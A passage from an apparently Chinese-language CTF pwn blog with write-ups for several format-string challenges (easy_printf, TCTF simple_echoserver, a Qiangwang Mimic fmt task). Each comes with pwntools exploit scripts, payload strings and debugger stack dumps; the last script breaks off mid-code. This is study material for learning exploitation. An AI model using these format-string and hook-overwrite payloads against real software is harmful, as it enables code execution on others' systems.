class="literal">True</span>:</span><br><span class="line">left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> left &lt; right :</span><br><span class="line">mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pwn(pos, <span class="built_in">ord</span>(possible_list[mid]))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">right = mid</span><br><span class="line">io.close()</span><br><span class="line">flag += possible_list[left]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> possible_list[left] == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos = pos + <span class="number">1</span></span><br><span class="line">success(flag)</span><br><span class="line">end = time.time()</span><br><span class="line">success(<span class="string">&quot;time:\t&quot;</span> + <span class="built_in">str</span>(end - start) + <span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure><p>网上找的exp,看了一下,每一段代码都有使用smc,但实际上在mmap后如果调用一个read往新mmap的内存写上想要的指令就不需要smc了</p><p>即第一次需要smc时构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap(addr,len....)</span><br><span class="line">read(0,addr,len)</span><br><span class="line">jmp addr</span><br></pre></td></tr></table></figure><h1 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h1><p><strong>标签:格式化字符串|printf触发malloc|%a占位符</strong></p><p>保护机制全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/easy_printf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>程序的主体就是两个printf的格式化字符串攻击,不过一个是正常的print但使用一次就会使用系统调用退出,还有一个是削弱了格式化字符串漏洞的__printf_chk函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy you the last time!&quot;</span>);</span><br><span class="line">  s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">0x80</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  v3 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v5 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your fmt: &quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x90</span>uLL);</span><br><span class="line">    s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">5uLL</span>)] = <span class="number">0</span>;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, s, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>比较常见的思路是先泄露栈再利用%n打rop,但因为printf只能使用一次就比较难办了</p><p>__printf_chk对格式化字符串的限制很大,几乎没有什么可利用的功能了</p><p>这就需要用到一个暂时还搞不太清楚原理的知识点,在__printf_chk函数格式化字符串用且只能用一个或者两个%a填充,能够打印出来stdin和stdout指针,以此泄露libc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%a</span><br><span class="line">0x0.07f6e76f5498p-1022</span><br><span class="line">%a%a</span><br><span class="line">0x0.07ffa5ebb098p-10220x0.07ffa5ebb16ap-1022</span><br><span class="line">%a%a%a</span><br><span class="line">null</span><br></pre></td></tr></table></figure><p>虽然不太懂原理,而且本地另写一个程序并没有复现成功,但在应对__printf_chk时不失为一个尝试</p><p>此后还要利用printf在输出超过65535长度的内容时会触发malloc这个知识点,并以此为基础修改malloc_hook为one_gadget并触发</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr2</span>(<span class="params">offset, addr, data, written</span>):</span><br><span class="line"><span class="keyword">global</span> cnt = <span class="number">0</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">address = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">cur = x</span><br><span class="line"><span class="keyword">if</span> cur &gt;= written&amp;<span class="number">0xff</span>:</span><br><span class="line">to_add = cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">to_add = <span class="number">0x100</span> + cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="built_in">round</span> = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> to_add != <span class="number">0</span>:</span><br><span class="line"><span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(to_add).encode()</span><br><span class="line"><span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(offset+cnt+<span class="built_in">len</span>(data)*<span class="number">2</span>).encode()</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">round</span>) &lt;= <span class="number">0x10</span>)</span><br><span class="line">written += to_add</span><br><span class="line">payload += <span class="built_in">round</span></span><br><span class="line">address += p64(addr+cnt)</span><br><span class="line">cnt+=<span class="number">1</span></span><br><span class="line"><span class="comment"># trigger malloc</span></span><br><span class="line"><span class="keyword">return</span> (payload+<span class="string">b&quot;%65537c&quot;</span>).ljust(<span class="number">0x50</span>,<span class="string">b&quot;_&quot;</span>) + address</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(<span class="string">&quot;./easy_printf&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your fmt: &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;%a%a\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x0.0&#x27;</span>)</span><br><span class="line">libc.address = (<span class="built_in">int</span>(p.recv(<span class="number">11</span>),<span class="number">16</span>) &lt;&lt; <span class="number">4</span>) - libc.symbols[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">hook_addr=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(hook_addr))</span><br><span class="line">one=libc.address+<span class="number">0xe3b04</span></span><br><span class="line">info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = fmtstr2(<span class="number">6</span>,hook_addr,p64(one)[:<span class="number">6</span>],<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里看ruan师傅的exp还学到了格式化字符串的%n的一个新姿势</p><p>即%hhn只写一个字节,如果写的数大于255那么只保留最后一个字节的数据</p><p>以此来稳定构造格式化字符串任意写</p><h1 id="2020tctf-simple-echoserver"><a href="#2020tctf-simple-echoserver" class="headerlink" title="2020tctf-simple_echoserver"></a>2020tctf-simple_echoserver</h1><p><strong>标签:格式化字符串|*占位符</strong></p><p>checksec发现保护全开</p><p>看一下程序的流程,读入name和phonenumber</p><p>拼接格式化字符串后由stderr输出,此处存在格式化字符串漏洞,不过只能利用一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_13C1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">snprintf</span>(byte_4060, <span class="number">0x100</span>uLL, <span class="string">&quot;[USER] name: %s; phone: %ld\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1, *(_QWORD *)(a1 + <span class="number">256</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, byte_4060);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是要一次利用printf的机会就完成利用,这就难办了</p><p>在没有其他帮助下,正常来说应该最少要两次格式化字符串利用才能完成利用</p><p>这里学到一个新姿势<code>*占位符</code>,*占位符以对应的函数参数的值作为一次变量输出的宽度</p><p>例如<code>printf(&quot;%*c%n&quot;,123,&#39;a&#39;,&amp;var);</code>就会输出123宽度的字符a</p><p>结合*??$即可获取栈上任意的值作为宽度</p><p>但这又有什么用呢?</p><p>如果我们结合%n,那么加上之前输出的宽度,岂不是可以在无输出的情况下完整的写一个地址</p><p>那么思路就有了</p><p>断点下在fprintf处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fff7221d658</span> —▸ <span class="number">0x55d2c7dcf41a</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fff7221d660</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fff7221d668</span> —▸ <span class="number">0x55d2c7dd2160</span> ◂— <span class="string">&#x27;%*48$c%801983c%26$n%221c%7$hhn&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fff7221d670</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fff7221d678</span> —▸ <span class="number">0x55d2c7dcf443</span> ◂— lea rdi, [rip + <span class="number">0xc5b</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fff7221d680</span> —▸ <span class="number">0x7fe104ff78a0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fff7221d688</span> —▸ <span class="number">0x7fe104e9fb9f</span> (_IO_file_underflow+<span class="number">383</span>) ◂— test rax, rax</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fff7221d690</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x7fff7221d698</span> —▸ <span class="number">0x7fe104e70d3f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov rcx, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x7fff7221d6a0</span> ◂— <span class="number">0x3000000008</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x7fff7221d6a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│     <span class="number">0x7fff7221d6b0</span> ◂— <span class="number">0x40584a0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0x7fff7221d6b8</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│     <span class="number">0x7fff7221d6c0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0x7fff7221d6c8</span> ◂— <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0x7fff7221d6d0</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│     <span class="number">0x7fff7221d6d8</span> —▸ <span class="number">0x55d2c7dcf0f0</span> ◂— endbr64 </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│     <span class="number">0x7fff7221d6e0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│     <span class="number">0x7fff7221d6e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│     <span class="number">0x7fff7221d6f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│     <span class="number">0x7fff7221d6f8</span> —▸ <span class="number">0x55d2c7dcf348</span> ◂— mov rcx, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│     <span class="number">0x7fff7221d700</span> —▸ <span class="number">0x7fe104ff84a0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│     <span class="number">0x7fff7221d708</span> —▸ <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│     <span class="number">0x7fff7221d710</span> ◂— <span class="string">&#x27;111111111111111111111111&#x27;</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│     <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x7fff7221d730</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0x7fff7221d738</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0x7fff7221d740</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│     <span class="number">0x7fff7221d748</span> —▸ <span class="number">0x55d2c7dcf28d</span> ◂— mov r12d, eax</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│     <span class="number">0x7fff7221d750</span> ◂— <span class="number">0x100c7dcf4e0</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│     <span class="number">0x7fff7221d758</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│     <span class="number">0x7fff7221d760</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│     <span class="number">0x7fff7221d768</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│     <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│     <span class="number">0x7fff7221d778</span> —▸ <span class="number">0x55d2c7dcf3b3</span> ◂— mov rdx, qword ptr [rbp - <span class="number">8</span>]</span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│     <span class="number">0x7fff7221d780</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│     <span class="number">0x7fff7221d788</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│     <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│     <span class="number">0x7fff7221d798</span> —▸ <span class="number">0x55d2c7dcf4d0</span> ◂— mov eax, <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0x7fff7221d7a0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0x7fff7221d7a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│     <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0x7fff7221d7b8</span> —▸ <span class="number">0x7fe104e33083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br></pre></td></tr></table></figure><p><code>2c:0160│</code>对应的参数偏移是48,于是%*48$c,打印0x7ffff7de6083宽度(有点哈人,幸好alarm给了600秒，而且还重定向了错误流)的字符出来</p><p>然后通过<code>16:00b0</code>%n改写<code>1a:00d0</code>为one_gadget</p><p>再然后就要考虑如何将返回流劫持到该处,发现程序会两次回栈,所以可以通过<code>03:0018│</code>修改<code>27:0138</code>处的rbp值,使第二次回栈的时候进入控制的流</p><p>于是<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dev_null = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./se&quot;</span>,stderr=dev_null)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your name: &quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;b fprintf</span></span><br><span class="line"><span class="string">b *$rebase(0x1335)&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;%*48$c%801983c%26$n%221c%7$hhn\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your phone: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;yourself!&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;~.\n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里还有最后一个槛,不算难但要发现着实有点困难</p><p>就是要在栈上构造出一个指向栈上的函数地址的栈,即出现<code>03:0018</code>这样的栈</p><p>正常来到fprintf并没有这样一个栈内存</p><p>不过很巧的是可以发现<code>16:00b0</code>处的值始终指向我们输入的字符的结尾</p><p>而在<code>1a:00d0</code>处有一个函数指针,所以如果刚好发送18个数字字符的话,就能获得一个满足要求的栈内存了</p><h2 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h2><p><code>/dev/null</code> 是一个特殊的设备文件，用于丢弃数据。在Unix-like系统中，<code>/dev/null</code> 表示空设备，写入它的数据会被丢弃，读取它则会立即得到一个文件结尾（End-of-File）。</p><h1 id="2023第六届强网拟态-fmt"><a href="#2023第六届强网拟态-fmt" class="headerlink" title="2023第六届强网拟态-fmt"></a>2023第六届强网拟态-fmt</h1><p><strong>标签:格式化字符串</strong></p><p>这题一个难点在于格式化字符串不在栈上</p><p>当然影响其实并不很大</p><p>首先程序会打印一个栈地址的最后两个字节</p><p>断在printf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde48</span> —▸ <span class="number">0x555555555250</span> (main+<span class="number">167</span>) ◂— mov edi, <span class="number">0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffde50</span> —▸ <span class="number">0x7fffffffdf50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffde58</span> ◂— <span class="number">0xafe57b979d2b8b00</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fffffffde68</span> —▸ <span class="number">0x7ffff7de6083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffde70</span> ◂— <span class="number">0x50</span> <span class="comment">/* &#x27;P&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fffffffde78</span> —▸ <span class="number">0x7fffffffdf58</span> —▸ <span class="number">0x7fffffffe2aa</span> ◂— <span class="string">&#x27;/home/aichch/pwn/fmt&#x27;</span></span><br></pre></td></tr></table></figure><p>可以发现此时栈上有一个三级栈指针06:0030</p><p>那么先利用%n修改0x7fffffffe2aa为0x7fffffffe248,再利用%n修改0x555555555250为read的地址</p><p>就可以多次利用格式化字符串漏洞了</p><p>泄露,打one_gadget就能完成利用</p><p><strong>exp:(自己写的未完成但大致是这么个思路)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> 